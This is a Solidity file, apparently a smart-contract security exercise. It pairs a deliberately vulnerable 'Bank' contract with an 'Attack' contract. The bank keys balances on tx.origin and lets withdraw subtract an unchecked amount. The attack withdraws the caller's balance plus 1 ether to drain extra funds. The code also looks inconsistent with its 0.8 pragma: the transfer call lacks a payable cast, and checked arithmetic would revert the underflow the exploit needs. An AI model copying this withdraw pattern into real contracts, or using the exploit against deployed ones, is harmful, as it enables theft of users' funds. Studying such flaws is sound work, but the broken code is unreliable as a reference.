// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Bank {
    mapping(address => uint256) public balanceOf;

    constructor() public payable {
        require(msg.value > 0, "Bad ether sent");
    }

    function getBalance() public view returns (uint256) {
        return (balanceOf[tx.origin]);
    }

    function deposit() public payable {
        require(tx.origin != msg.sender, "Bad sender");
        balanceOf[tx.origin] += msg.value;
    }

    function withdraw(uint256 value) public {
        require((tx.origin != msg.sender) && (balanceOf[tx.origin] > 0), "Bad sender or balance");
        balanceOf[tx.origin] -= value;
        if (value > address(this).balance)
            tx.origin.transfer(address(this).balance);
        else
            tx.origin.transfer(value);
    }
}
contract Attack {

    Bank public wallet;

    constructor(Bank _wallet) public  {
        wallet =_wallet;
   
    }
 

     function getWalletBalance() public view returns (uint256) {
        return  wallet.getBalance();
    }
    function deposit() public payable {
       wallet.deposit{value: msg.value}();
      
    }

      function attack() public {
          uint256 all=wallet.getBalance()+ 1 ether;
       wallet.withdraw(all);
      
    }
}